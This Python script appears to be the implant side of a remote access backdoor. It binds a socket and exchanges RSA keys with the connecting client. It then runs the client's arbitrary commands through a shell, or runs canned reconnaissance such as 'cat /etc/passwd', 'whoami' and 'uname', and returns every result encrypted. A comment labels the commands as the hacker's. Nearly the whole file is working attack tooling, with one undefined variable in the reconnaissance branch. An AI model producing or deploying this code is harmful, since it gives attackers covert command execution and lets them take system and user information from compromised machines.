# coding: utf-8
import socket, sys, subprocess, time, base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives import serialization

remote_public_key = None
public_key_pem = None
private_key = None

class Configuration():

    def __init__(self):

        self.ip = "127.0.0.1"
        self.port = 12800
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((self.ip, self.port))
        self.s.listen(5)
        self.connexion_client, self.address_info = self.s.accept()

        global private_key
        global public_key_pem
        private_key = self.generate_private_key()
        public_key_pem = self.extract_public_key(private_key.public_key())

        self.communication = Communication(self.connexion_client)
        self.connexion_client.close()

    def generate_private_key(self):
        return rsa.generate_private_key(backend=default_backend(),
                                        public_exponent=65537,
                                        key_size=2048)

    def extract_public_key(self,public_key):
        return public_key.public_bytes(encoding=serialization.Encoding.PEM,
                                        format=serialization.PublicFormat.SubjectPublicKeyInfo)


class Communication(Configuration):

    def __init__(self, connexion_client):
        #Handle output messages
        self.connexion_client = connexion_client
        self.send_public_keys()
        self.options_chosen()

    def options_chosen(self):
        #Option to choose the shell or get_info
        server_call = True
        answer = self.connexion_client.recv(1024)
        answer = base64.b64decode(answer)
        answer = self.decrypt(answer)
        answer = answer.decode("utf-8")
        #answer = int(answer)

        while server_call:
            if answer == "1" or answer == "2":
                if answer == "1":
                    self.remote_shell()
                else:
                    self.get_info() 

                answer = self.connexion_client.recv(1024)
                answer = base64.b64decode(answer)
                answer = self.decrypt(answer)
                answer = answer.decode("utf-8")
                #answer = int(answer)
            else:
                server_call = False
                self.connexion_client.close()

    def remote_shell(self):
        #Used the command line with hacker's command
        serveur_running = True
        command = ""

        while serveur_running:
            result = []
            
            command = self.connexion_client.recv(1024)
            command = base64.b64decode(command)
            command = self.decrypt(command)
            command = command.decode("utf-8")

            if command != "exit": 
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 

                for line in process.stdout:
                    result.append(line)
                errcode = process.returncode
            
                nb_result = len(result)
                nb_result_str = str(nb_result)

                nb_result_str = nb_result_str.encode("utf-8")
                nb_result_str = self.encrypt(nb_result_str)
                nb_result_str = base64.b64encode(nb_result_str)
                self.connexion_client.send(nb_result_str)

                for line in result:
                    line = self.encrypt(line)
                    line = base64.b64encode(line)
                    self.connexion_client.send(line)
                    time.sleep(0.05)    
            else:
                serveur_running = False

    def get_info(self):
        #Used the command line with auto-selected command
        ip_l = "ip addr"
        user_l = "cat /etc/passwd"
        documents_l = "ls /home/user/"
        infosystem_l = "uname -nvrma"
        ip_w = "ipconfig"
        user_w = "whoami"

        client_running = True
        while client_running:

            result = []     
            command = self.connexion_client.recv(1024)
            command = base64.b64decode(command)
            command = self.decrypt(command)
            command = command.decode("utf-8")
            
            if command != "exit":

                if command == "ip_w":
                    commander = ip_w
                elif command == "user_w":
                    commander = user_w
                elif command == "ip_l":
                    commander = ip_l
                elif command == "user_l":
                    commander = user_l
                elif command == "documents_l":
                    commander = documents_l
                elif command == "info_l":
                    commander = info_l
                else:
                    commander = "exit"

                process = subprocess.Popen(commander, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)   

                for line in process.stdout: #Remplit la liste
                    result.append(line)
                errcode = process.returncode
            
                nb_result = len(result)
                nb_result_str = str(nb_result)

                nb_result_str = nb_result_str.encode("utf-8")
                nb_result_str = self.encrypt(nb_result_str)
                nb_result_str = base64.b64encode(nb_result_str)
                self.connexion_client.send(nb_result_str)

                for line in result:
                    line = self.encrypt(line)
                    line = base64.b64encode(line)
                    self.connexion_client.send(line)
                    time.sleep(0.05)
            else:
                client_running = False

    def encrypt(self, message):
            #global remote_public_key
            return remote_public_key.encrypt(message, 
                                            padding.OAEP(
                                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                            algorithm=hashes.SHA256(),
                                            label=None))

    def decrypt(self, ciphertext):
        global private_key
        return private_key.decrypt(ciphertext,
                                        padding.OAEP(
                                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                        algorithm=hashes.SHA256(),
                                        label=None))

    def send_public_keys(self):

        self.connexion_client.send(public_key_pem)

        global remote_public_key
        remote_public_key_pem = self.connexion_client.recv(1024)
        remote_public_key = load_pem_public_key(remote_public_key_pem, backend=default_backend())
        #print("Remote public key successfully loaded")


conf = Configuration()
